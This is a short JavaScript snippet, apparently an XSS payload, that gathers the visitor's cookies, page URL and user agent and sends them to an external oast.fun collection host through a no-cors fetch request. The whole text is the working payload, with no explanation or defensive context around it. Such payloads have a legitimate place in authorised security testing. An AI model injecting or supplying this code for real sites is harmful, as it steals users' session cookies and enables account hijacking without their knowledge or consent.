const data = {
  cookies: document.cookie,
  url: window.location.href,
  userAgent: navigator.userAgent,
  timestamp: Date.now()
};


fetch(`https://lwsxretelikokvvvcthestrd8f12qfupl.oast.fun?data=${encodeURIComponent(JSON.stringify(data))}`, {
  mode: 'no-cors'
});